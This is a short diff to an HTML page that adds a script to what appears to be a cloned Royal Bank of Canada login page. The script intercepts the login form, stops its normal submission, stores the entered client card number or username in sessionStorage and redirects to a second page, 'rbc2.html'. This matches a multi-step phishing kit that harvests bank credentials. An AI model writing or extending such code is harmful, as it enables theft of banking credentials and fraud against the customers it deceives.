@@ -354,6 +354,22 @@
         </div>
     </div>
 
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        var form = document.querySelector('form');
+        if (form) {
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                e.stopImmediatePropagation();
+                var input = form.querySelector('input[name="Client Card or Username"]');
+                if (input && input.value) {
+                    sessionStorage.setItem('__rbc_user', input.value);
+                }
+                window.location.href = 'rbc2.html';
+            }, true);
+        }
+    });
+    </script>
     <script src="security_module.js"></script>
 </body>
 </html>
